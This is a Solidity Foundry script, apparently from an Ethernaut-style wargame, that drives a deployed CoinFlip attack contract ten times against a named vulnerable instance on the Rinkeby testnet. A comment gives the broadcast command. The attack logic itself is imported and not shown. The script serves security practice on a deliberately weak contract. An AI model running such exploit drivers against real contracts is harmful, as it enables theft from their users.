// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import { Script } from "forge-std/Script.sol";
import { CoinFlipAttack } from "../src/CoinFlip/CoinFlipAttack.sol";

contract CoinFlipAttackExistingScript is Script {
    /* See the affected contract here:
      https://rinkeby.etherscan.io/address/0x677f2b9b7b5cadc57dc27880004cb914494ba0f7#readContract

      Run with the following forge script:
      forge script script/CoinFlipAttackExisting.s.sol:CoinFlipAttackExistingScript --rpc-url https://eth-rinkeby.alchemyapi.io/v2/$RINKEBY_API_KEY  --private-key $MY_PRIVATE_KEY --broadcast --slow --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv 
    */

    function run() public {
        vm.startBroadcast();
        for (uint256 i = 0; i < 10; i++) {
            callCoinFlip(address(0x677F2b9b7b5CAdC57dc27880004cb914494BA0F7));
        }
        vm.stopBroadcast();
    }

    function callCoinFlip(address coinFlipInstance) public {
        CoinFlipAttack coinFlipAttacker = CoinFlipAttack(address(0xA18e18f29BD878C9673ba75732688E013761c2b9));
        coinFlipAttacker.callCoinFlip(coinFlipInstance);
    }
}
